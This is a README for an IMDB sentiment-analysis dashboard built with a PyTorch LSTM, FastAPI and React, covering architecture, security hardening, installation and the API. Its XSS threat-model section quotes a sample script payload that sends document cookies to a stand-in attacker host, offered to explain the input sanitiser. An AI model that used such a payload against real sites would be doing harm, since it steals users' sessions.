#  —Secure Neural Sentiment Analysis Dashboard

> **A production-grade, OWASP-hardened full-stack AI system** — bridging a custom-trained PyTorch LSTM neural network with an asynchronous FastAPI backend and a zero-build React 18 frontend, hardened from the ground up against the most critical web application security threats.

CANTILEVER is a complete end-to-end movie review sentiment classification system trained on the IMDB dataset, achieving **86.61% accuracy** on a held-out test set of 25,000 blind reviews. The stack is intentionally minimal and dependency-lean: **PyTorch** drives the neural inference engine, **FastAPI** provides the asynchronous HTTP bridge with automated request validation, **React 18** renders an interactive dark-mode dashboard parsed directly in the browser via Babel Standalone, and **NLTK** orchestrates the NLP preprocessing pipeline that conditions raw user text into model-ready tensors. **Tailwind CSS** delivers the styling layer via CDN with zero local build configuration required. The entire system runs from a single directory, starts with a single command, and serves both the API and the UI on one unified local origin.

---

## Table of Contents

1. [Key Architecture Features](#key-architecture-features)
2. [Deep-Dive Cyber Security Layer](#deep-dive-cyber-security-layer)
3. [The Data Processing Pipeline](#the-data-processing-pipeline)
4. [Installation & Deployment Guide](#installation--deployment-guide)
5. [Directory Layout Mapping](#directory-layout-mapping)
6. [API Reference](#api-reference)
7. [Model Training Summary](#model-training-summary)

---

## Key Architecture Features

### 🧠 The Brain — PyTorch LSTM Neural Network

The core inference engine is a custom `SentimentLSTM` class implemented in PyTorch (`torch.nn.Module`). The architecture was designed to process variable-length, pre-padded token sequences and output a single scalar probability score representing the degree of positive sentiment.

**Exact Architecture Parameters:**

| Layer | Type | Configuration |
|---|---|---|
| **Input** | `nn.Embedding` | `vocab_size=10001`, `embedding_dim=400` |
| **Recurrent** | `nn.LSTM` | `input=400`, `hidden_dim=256`, `num_layers=2`, `batch_first=True`, `dropout=0.5` |
| **Regularisation** | `nn.Dropout` | `p=0.5` |
| **Output** | `nn.Linear` → `nn.Sigmoid` | `in_features=256`, `out_features=1` |

```
SentimentLSTM(
  (embedding): Embedding(10001, 400)
  (lstm):      LSTM(400, 256, num_layers=2, batch_first=True, dropout=0.5)
  (dropout):   Dropout(p=0.5, inplace=False)
  (fc):        Linear(in_features=256, out_features=1, bias=True)
  (sigmoid):   Sigmoid()
)
```

- **Embedding Dimension (400):** Each of the 10,001 vocabulary tokens (10,000 content words + 1 reserved zero-padding index) is mapped to a dense 400-dimensional floating-point vector. This learned representation captures semantic relationships between tokens during training.
- **2-Layer LSTM (hidden_dim=256):** The stacked LSTM processes the embedded sequence recurrently. Each hidden state is a 256-dimensional vector encoding the sequential context accumulated up to that token position. Using 2 layers allows the network to learn hierarchical temporal patterns — lower layers capture surface-level n-gram patterns while upper layers model higher-level sentiment abstractions.
- **Dropout (p=0.5):** Applied between the LSTM output and the classification head. During training, this randomly zeroes 50% of neuron activations per forward pass, acting as an ensemble regulariser that prevents memorisation of training examples. Dropout is automatically disabled during inference via `model.eval()`.
- **Sigmoid Activation:** The final scalar output is squashed into the range `[0.0, 1.0]`. Values `≥ 0.5` are classified as **Positive**; values `< 0.5` are classified as **Negative**. The distance from 0.5 determines the reported confidence percentage: `max(p, 1-p) × 100`.
- **Sequence Handling:** Only the LSTM's output at the **final time-step** (`lstm_out[:, -1, :]`) is fed to the classification head, as this state encodes a summary of the entire review sequence.

---

### ⚙️ The Bridge — FastAPI Asynchronous Backend (`main.py`)

The backend is a single `main.py` FastAPI application built around three engineering principles: **async-first request handling**, **startup-time resource caching**, and **layered security validation**.

- **Asynchronous Request Handling:** All endpoint handlers are declared `async def`, delegating I/O-bound operations (file reads, JSON serialisation) to Python's `asyncio` event loop without blocking the server thread. This allows the server to handle multiple concurrent requests efficiently on a single CPU core without multi-threading overhead.

- **Lifespan-Managed Startup Loading:** Using FastAPI's `@asynccontextmanager` lifespan hook, all expensive one-time operations are executed exactly once when the server process boots — not on each request. This includes:
  - Downloading and caching NLTK `stopwords` and `wordnet` corpora to disk.
  - Parsing and loading `vocab.json` into an in-memory Python dictionary (`dict[str, int]`).
  - Reconstructing the `SentimentLSTM` architecture and mapping all 20.8 MB of checkpoint weights from `sentiment_lstm.pth` onto the CPU via `torch.load(..., map_location=torch.device('cpu'), weights_only=True)`.
  - Calling `model.eval()` to permanently lock the model in inference mode, disabling dropout layers for all subsequent predictions.

- **CPU-Pinned Inference:** The model is explicitly mapped to CPU (`torch.device('cpu')`), making the deployment portable across any machine without requiring CUDA drivers or GPU hardware.

- **Pydantic Schema Validation:** Incoming `POST /analyze` request bodies are automatically validated against a `ReviewPayload(BaseModel)` schema before any application logic runs. Payloads that fail structural validation are rejected at the framework boundary with an automatic **HTTP 422 Unprocessable Entity** response — the handler function is never invoked.

- **`FileResponse` Frontend Serving:** The `GET /` endpoint uses FastAPI's `FileResponse` to serve `index.html` with proper MIME typing, ETag headers, and HTTP range support, unifying both the API and the UI under a single local origin (`http://127.0.0.1:8000`). This is what makes the CORS strict allow-list viable.

---

### 🖥️ The Interface — Zero-Build React Frontend (`index.html`)

The frontend is engineered under the **Antigravity architecture paradigm**: the complete interactive React application is delivered as a single `index.html` file with absolutely no local build toolchain, no `node_modules` directory, no `package.json`, no Webpack, no Vite, and no npm scripts. The entire runtime is assembled client-side from secure CDN links.

**CDN Engine Stack:**

| Engine | CDN Source | Role |
|---|---|---|
| **Tailwind CSS** | `cdn.tailwindcss.com` | Utility-first styling framework with custom token extensions |
| **React 18** | `unpkg.com/react@18/umd/react.development.js` | Core component rendering engine |
| **ReactDOM 18** | `unpkg.com/react-dom@18/umd/react-dom.development.js` | DOM reconciler and `createRoot` mount |
| **Babel Standalone** | `unpkg.com/@babel/standalone/babel.min.js` | In-browser JSX transpiler via `<script type="text/babel">` |
| **Google Fonts** | `fonts.googleapis.com` | Inter (UI) + JetBrains Mono (code/data) |

**Why This Architecture?**

Rather than shipping a pre-compiled JavaScript bundle, the `<script type="text/babel">` block contains raw JSX source code. Babel Standalone intercepts this script tag, transpiles the JSX to vanilla JavaScript at page-load time in the user's browser, and React mounts the application into the `<div id="root">` anchor. This approach eliminates the entire Node.js build pipeline while retaining the full React component model, hooks API (`useState`, `useCallback`, `useRef`), and JSX template syntax.

**UI Component Architecture:**

```
<App>                       ← Root state owner (review, isLoading, result, error)
├── <header>                ← Sticky top bar with brand and live API status
├── <main>
│   ├── Hero Heading        ← Animated gradient title
│   ├── <CyberResilienceBadge>  ← Animated shield + 3 security status pills
│   ├── Input Section
│   │   ├── <CharCounter>   ← Live character count with colour state warnings
│   │   ├── <textarea>      ← Controlled input, disabled during fetch
│   │   └── Analyze Button  ← Disabled + animated loading state during request
│   ├── <ErrorBanner>       ← Conditional; renders only on fetch failure
│   └── <ResultCard>        ← Conditional; emerald (Positive) / crimson (Negative)
└── <footer>
```

**Visual Design System:**
- **Background:** Neon-grid dark canvas (`#0a0f1a`) with `radial-gradient` accent glows.
- **Cards:** Glassmorphism surfaces (`backdrop-filter: blur(20px)`, 75% opacity dark fill) with subtle indigo border accents.
- **Typography:** Inter for all UI copy; JetBrains Mono for all data values and confidence readouts.
- **Animations:** `animate-fade-in`, `animate-slide-up`, `animate-glow-cycle`, pulsing scan-line effect on the result card, and a 3-dot bounce loading indicator during API calls.
- **Accessibility:** All interactive elements carry `aria-label`, `aria-live`, `aria-disabled`, `role`, and `aria-describedby` attributes for screen reader compatibility.

---

## Deep-Dive Cyber Security Layer

CANTILEVER implements a multi-layer defence strategy targeting the **OWASP Top 10** most critical web application security risks. Protections are applied at every tier: schema validation, text sanitisation, transport policy, and UI state management.

---

### 🛡️ [1] DoS Mitigation via Input Validation (OWASP A04 — Insecure Design)

**Threat Model:** An attacker submits a multi-megabyte string payload to the `/analyze` endpoint. Without a ceiling, the server would attempt to tokenise, lemmatise, and convert an arbitrarily large string into tensors, consuming unbounded RAM and CPU time — effectively a targeted memory exhaustion Denial-of-Service attack.

**Implementation:**

```python
class ReviewPayload(BaseModel):
    review: str = Field(
        ...,
        min_length  = 1,
        max_length  = 5_000,     # Hard DoS ceiling
        title       = "Movie Review",
        description = "Raw review text. Max 5,000 characters.",
    )
```

**Effect:** Pydantic's validation layer intercepts the request body **before the handler function is invoked**. Any payload where `len(review) > 5000` is automatically rejected by FastAPI with an `HTTP 422 Unprocessable Entity` response containing a structured validation error. The inference pipeline, NLTK stack, and PyTorch model are never reached. This cap is also mirrored in the frontend via `maxLength={5000}` on the `<textarea>` element, providing a first-layer client-side barrier.

---

### 🛡️ [2] XSS Neutralisation via Input Sanitisation (OWASP A03 — Injection)

**Threat Model:** A malicious actor submits a review containing embedded HTML or JavaScript: e.g., `<script>fetch('https://evil.com?c='+document.cookie)</script>`. If this string were tokenised and the tokens were stored, displayed, or re-rendered unsanitised, it could execute as code in a victim's browser (stored XSS) or be logged in a way that compromises downstream systems.

**Implementation:**

```python
# Pre-compiled regex patterns (compiled once at module load for performance)
_RE_HTML  = re.compile(r"<[^>]+>")     # Matches any HTML/script tag structure
_RE_ALPHA = re.compile(r"[^a-zA-Z\s]") # Keeps only alphabetical characters

def preprocess(raw_text: str) -> torch.Tensor:
    # Step 1 — Strip ALL HTML structures including <script>...</script> vectors
    text = _RE_HTML.sub(" ", raw_text)

    # Step 2 — Strip everything except a-z, A-Z, and whitespace
    text = _RE_ALPHA.sub("", text).lower()
    ...
```

**Effect:** The regex `r"<[^>]+>"` matches and replaces any substring beginning with `<`, containing any characters except `>`, and ending with `>` — this structurally disables `<script>`, `<img onerror=...>`, `<iframe>`, `<svg onload=...>`, and all other HTML injection vectors. The subsequent `r"[^a-zA-Z\s]"` pass reduces the entire string to pure alphabetical tokens, eliminating angle brackets, semicolons, parentheses, and URL schemes that form the structural scaffolding of injection payloads. By the time any string data reaches the PyTorch tensor pipeline, it is guaranteed to contain only lowercase English letters and spaces.

---

### 🛡️ [3] Strict CORS Policy (OWASP A05 — Security Misconfiguration)

**Threat Model:** A malicious website at `https://phishing-site.com` loads a script that calls `fetch('http://127.0.0.1:8000/analyze', {...})`. Without CORS restrictions, the browser would forward the request and the response (including any inference results or error details) would be readable by the attacker's page.

**Implementation:**

```python
ALLOWED_ORIGINS = [
    "http://127.0.0.1:8000",
    "http://localhost:8000",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins     = ALLOWED_ORIGINS,   # Explicit allowlist — no wildcards
    allow_credentials = False,             # Blocks cookie/session sharing
    allow_methods     = ["GET", "POST"],   # Minimum required HTTP verbs only
    allow_headers     = ["Content-Type"], # Minimum required headers only
)
```

**Effect:** The `CORSMiddleware` intercepts all incoming requests and checks the `Origin` header against the allowlist. Any preflight (`OPTIONS`) or actual request from an origin not in `ALLOWED_ORIGINS` receives a response without the `Access-Control-Allow-Origin` header, causing the browser to block the response from being read by the requesting script. Since both the API and the UI are served from the same origin (`http://127.0.0.1:8000`), all legitimate same-origin requests from the frontend are unaffected. The explicit restriction of `allow_credentials=False`, `allow_methods=["GET","POST"]`, and `allow_headers=["Content-Type"]` minimises the CORS attack surface beyond just origin filtering.

---

### 🛡️ [4] Spam Prevention & UI Resilience (OWASP A04 — Insecure Design)

**Threat Model:** A user (or automated script with browser access) rapidly clicks the "Analyse" button, firing multiple concurrent POST requests to `/analyze`. On the server, each request initiates an NLTK pipeline execution and a PyTorch forward pass. Concurrent request floods could saturate CPU resources.

**Implementation (Frontend State Machine):**

```javascript
const handleAnalyze = useCallback(async () => {
    if (!canSubmit) return;          // Guard: blocks if already loading

    setIsLoading(true);              // Immediately lock the form
    setResult(null);
    setError(null);

    try {
        const response = await fetch(API_ENDPOINT, { ... });
        ...
        setResult({ ... });
    } catch (err) {
        setError(/* user-safe message — no stack traces */);
    } finally {
        setIsLoading(false);         // Unlock only after full response cycle
    }
}, [review, canSubmit]);
```

**Effect:** The `canSubmit` derived state (`charCount > 0 && charCount <= MAX_CHARS && !isLoading`) is `false` the moment a request is in-flight. The Analyse button renders as `disabled` with `cursor-not-allowed` styling and a pulsing animated loading state (spinner + 3-dot bounce), providing clear visual feedback and making the clickable target non-functional. The form is re-enabled only inside the `finally` block, guaranteeing unlock even on network failure. This eliminates double-submission and client-side request flooding at the UI layer.

Additionally, the `try/catch` block maps all network and HTTP errors to **pre-written, user-safe string messages** — internal server errors, stack traces, database states, and model details are never forwarded to the browser. HTTP 422 → validation message, HTTP 5xx → generic server error message, `TypeError` (network down) → connectivity message.

---

## The Data Processing Pipeline

The following sequence describes the exact transformation path a raw user-entered string travels from the browser textarea to the final JSON sentiment prediction.

```
USER INPUT (raw string, max 5,000 chars)
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 1 — VALIDATION & SANITISATION (FastAPI/Pydantic) │
│                                                         │
│  • Pydantic Field(max_length=5000) enforced             │
│    → HTTP 422 returned immediately if exceeded          │
│  • _RE_HTML  = re.sub(r'<[^>]+>', ' ', text)            │
│    → All HTML tags, <script>, <img>, <iframe> stripped  │
│  • _RE_ALPHA = re.sub(r'[^a-zA-Z\s]', '', text)         │
│    → Numbers, punctuation, brackets, URLs removed       │
│  • .lower() → Full lowercase normalisation              │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 2 — NLTK TEXT CONDITIONING                       │
│                                                         │
│  • .split() → Tokenise string into word list            │
│  • stopwords.words('english') filter applied            │
│    → "the", "is", "a", "and", "of", ... removed        │
│  • WordNetLemmatizer().lemmatize(token) per token       │
│    → "running" → "run", "movies" → "movie"             │
│    → "better" → "good", "was" → "wa" (surface form)    │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 3 — VOCABULARY INDEX MAPPING                     │
│                                                         │
│  • Each clean token looked up in vocab.json dict        │
│    vocab = { "movie": 1, "film": 2, "great": 3, ... }  │
│  • Matched tokens → integer index (1 to 10,000)         │
│  • Unknown tokens (OOV) → silently skipped              │
│    (no UNK token used; OOV handled by omission)         │
│  • Result: list of integers, e.g. [1, 413, 57, 3, ...] │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 4 — TENSOR OPTIMISATION (Pad / Truncate)         │
│                                                         │
│  SEQ_LENGTH = 200 (fixed, matching training config)     │
│                                                         │
│  features = np.zeros(200, dtype=np.int64)               │
│  if encoded:                                            │
│      seq = np.array(encoded[:200])   ← Truncate long   │
│      features[-len(seq):] = seq      ← Pre-pad short   │
│                                                         │
│  Pre-padding places zeros at the front of the array,   │
│  ensuring the final LSTM time-step always sees real     │
│  content — identical to training behaviour.             │
│                                                         │
│  torch.from_numpy(features).unsqueeze(0)               │
│  → LongTensor of shape (1, 200) [batch=1, seq=200]     │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 5 — NO-GRAD LSTM INFERENCE                       │
│                                                         │
│  hidden = model.init_hidden(batch_size=1, device=cpu)  │
│                                                         │
│  with torch.no_grad():                                  │
│      output, _ = model(input_tensor, hidden)           │
│      # output shape: (1, 1) — scalar probability       │
│                                                         │
│  probability = output.item()  # e.g. 0.9142            │
│                                                         │
│  torch.no_grad() disables gradient computation graph   │
│  tracking — reduces memory allocation by ~50% and      │
│  eliminates unnecessary autograd overhead on CPU.      │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 6 — RESPONSE FORMATTING                          │
│                                                         │
│  sentiment  = "Positive" if p >= 0.5 else "Negative"   │
│  confidence = max(p, 1.0 - p) * 100.0                  │
│                                                         │
│  → {"sentiment": "Positive", "confidence": "91.42%"}   │
└─────────────────────────────────────────────────────────┘
```

---

## Installation & Deployment Guide

### System Prerequisites

| Requirement | Minimum Version | Notes |
|---|---|---|
| **Python** | 3.8+ | 3.9+ recommended (installed via `python3`) |
| **pip** | Any | Use `pip3` on macOS systems |
| **Internet** | Required (first run) | NLTK downloads `stopwords` + `wordnet` corpora once |
| **RAM** | 512 MB+ | Model weights load ~80 MB into Python process |
| **GPU** | Not required | All inference runs on CPU (`map_location='cpu'`) |

---

### Step 1 — Clone or Navigate to the Project Directory

```bash
# If downloaded as a zip, extract and navigate into it:
cd /path/to/CANTILEVER

# Verify the required model artefacts are present:
ls -lh
# Expected output:
#   index.html
#   main.py
#   sentiment_lstm.ipynb
#   sentiment_lstm.pth     (~20 MB — the trained weights)
#   vocab.json             (~163 KB — the vocabulary mapping)
```

---

### Step 2 — Install Python Dependencies

```bash
# Standard pip3 install (macOS / Linux)
pip3 install fastapi "uvicorn[standard]" torch pydantic nltk numpy

# Or using pip directly (Windows / virtualenv environments)
pip install fastapi "uvicorn[standard]" torch pydantic nltk numpy
```

**Installed Package Versions (verified working):**

| Package | Version |
|---|---|
| `fastapi` | 0.128.8+ |
| `uvicorn[standard]` | 0.39.0+ |
| `torch` | 2.8.0+ |
| `pydantic` | 2.13.4+ |
| `nltk` | 3.9.2+ |
| `numpy` | 2.0.2+ |

> **Note:** `uvicorn[standard]` installs `uvloop` (faster event loop on Unix), `httptools` (faster HTTP parser), and `websockets` alongside the base uvicorn server.

---

### Step 3 — Launch the Application

**Option A — Direct Python launch (recommended):**
```bash
python3 main.py
```

**Option B — Uvicorn CLI with hot-reload (development mode):**
```bash
uvicorn main:app --host 127.0.0.1 --port 8000 --reload
```

**Expected startup output:**

```
INFO:     Started server process [XXXXX]
INFO:     Waiting for application startup.
2026-05-29 20:18:23,290  [INFO]  ⚙  Bootstrapping CANTILEVER API…
2026-05-29 20:18:23,290  [INFO]    ↳ Downloading NLTK corpora (stopwords, wordnet)…
2026-05-29 20:18:33,739  [INFO]    ✔  NLTK ready
2026-05-29 20:18:33,740  [INFO]    ↳ Loading vocabulary from /path/to/vocab.json…
2026-05-29 20:18:33,744  [INFO]    ✔  Vocabulary loaded — 10,000 tokens
2026-05-29 20:18:33,744  [INFO]    ↳ Loading model weights from /path/to/sentiment_lstm.pth…
2026-05-29 20:18:33,811  [INFO]    ✔  Model loaded and placed in eval() mode
2026-05-29 20:18:33,811  [INFO]  🚀  CANTILEVER API is LIVE
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
```

> **First-run note:** The NLTK download step (downloading `stopwords` and `wordnet` corpora) requires an active internet connection and takes approximately 5–10 seconds. On subsequent runs, the cached data is loaded from disk in milliseconds.

---

### Step 4 — Access the Application

| Endpoint | URL | Description |
|---|---|---|
| **Dashboard UI** | `http://127.0.0.1:8000` | The full React frontend interface |
| **Inference API** | `http://127.0.0.1:8000/analyze` | `POST` — JSON sentiment endpoint |
| **Swagger Docs** | `http://127.0.0.1:8000/docs` | Interactive OpenAPI documentation |

---

### Step 5 — Test the API Directly (Optional)

```bash
# Test with curl — positive review
curl -X POST "http://127.0.0.1:8000/analyze" \
     -H "Content-Type: application/json" \
     -d '{"review": "An absolute masterpiece. The performances were breathtaking and the direction was flawless."}'

# Expected response:
# {"sentiment":"Positive","confidence":"94.27%"}

# Test with curl — negative review
curl -X POST "http://127.0.0.1:8000/analyze" \
     -H "Content-Type: application/json" \
     -d '{"review": "Utterly dreadful. A waste of two hours with no coherent plot or character development."}'

# Expected response:
# {"sentiment":"Negative","confidence":"88.13%"}

# Test DoS protection — payload exceeding 5,000 characters
python3 -c "import requests; r = requests.post('http://127.0.0.1:8000/analyze', json={'review': 'x' * 5001}); print(r.status_code, r.json())"
# Expected: 422 {'detail': [{'type': 'string_too_long', ...}]}
```

---

## Directory Layout Mapping

```
CANTILEVER/
│
├── main.py                     ← FastAPI application server
│   │                              • SentimentLSTM class definition (mirrors training)
│   │                              • Lifespan hook: loads vocab + weights on boot
│   │                              • CORSMiddleware (strict local origin policy)
│   │                              • ReviewPayload Pydantic schema (5,000 char cap)
│   │                              • preprocess() NLP pipeline (XSS strip → tensor)
│   │                              • POST /analyze  — inference endpoint
│   │                              • GET  /         — serves index.html
│   │
├── index.html                  ← Zero-build React 18 frontend (single file)
│   │                              • Tailwind CSS via CDN (custom token config)
│   │                              • React 18 + ReactDOM via unpkg CDN
│   │                              • Babel Standalone (JSX parsed in-browser)
│   │                              • <CyberResilienceBadge> — security status UI
│   │                              • <ResultCard> — conditional Pos/Neg styling
│   │                              • <ErrorBanner> — sandboxed error display
│   │                              • Async fetch pipeline with double-submit lock
│   │
├── sentiment_lstm.pth          ← Trained PyTorch model weights checkpoint
│   │                              • PyTorch state_dict format
│   │                              • ~20.8 MB
│   │                              • Loaded via torch.load(..., weights_only=True)
│   │
├── vocab.json                  ← Vocabulary token-to-index mapping dictionary
│   │                              • JSON object: {"word": integer_index, ...}
│   │                              • 10,000 entries (top words by training frequency)
│   │                              • Index 0 reserved for padding (not in file)
│   │                              • ~163 KB
│   │
└── sentiment_lstm.ipynb        ← Original Google Colab training notebook
                                   • Dataset: stanfordnlp/imdb (HuggingFace)
                                   • Training: 25,000 reviews, 3 epochs, Adam lr=0.001
                                   • Test set: 25,000 blind reviews
                                   • Final test accuracy: 86.61%
                                   • Exports: sentiment_lstm.pth + vocab.json
```

---

## API Reference

### `POST /analyze`

Runs the full NLP preprocessing pipeline and LSTM inference on the submitted review text.

**Request Body:**
```json
{
  "review": "string (1–5,000 characters, required)"
}
```

**Success Response — `200 OK`:**
```json
{
  "sentiment": "Positive",
  "confidence": "91.42%"
}
```

**Validation Error — `422 Unprocessable Entity`:**
```json
{
  "detail": [
    {
      "type": "string_too_long",
      "loc": ["body", "review"],
      "msg": "String should have at most 5000 characters",
      "input": "...",
      "ctx": { "max_length": 5000 }
    }
  ]
}
```

| Field | Type | Constraints |
|---|---|---|
| `review` | `string` | `min_length=1`, `max_length=5000` |

| Response Field | Type | Values |
|---|---|---|
| `sentiment` | `string` | `"Positive"` or `"Negative"` |
| `confidence` | `string` | `"XX.XX%"` format, range 50.00%–100.00% |

---

### `GET /`

Serves the `index.html` single-page React application.

**Response:** `200 OK` — `Content-Type: text/html`

---

## Model Training Summary

| Property | Value |
|---|---|
| **Dataset** | Stanford IMDB (via HuggingFace `stanfordnlp/imdb`) |
| **Training Split** | 25,000 labelled movie reviews |
| **Test Split** | 25,000 blind labelled reviews |
| **Vocabulary Size** | 10,000 most frequent words (+ 1 pad index = 10,001) |
| **Sequence Length** | 200 tokens (pre-padded with zeros) |
| **Batch Size** | 50 |
| **Optimiser** | Adam (`lr=0.001`) |
| **Loss Function** | Binary Cross-Entropy (`nn.BCELoss`) |
| **Epochs** | 3 |
| **Epoch 1 Accuracy** | 65.83% |
| **Epoch 2 Accuracy** | 80.86% |
| **Epoch 3 Accuracy** | 87.77% |
| **Final Test Accuracy** | **86.61%** |
| **Final Test Loss** | 0.3254 |
| **Weights File Size** | ~20.8 MB (`sentiment_lstm.pth`) |
| **Training Platform** | Google Colab (CPU runtime) |

---

<div align="center">

**CANTILEVER** · PyTorch LSTM · FastAPI · React 18 · NLTK · OWASP-Hardened

Zero build steps. One command. Production security.

</div>
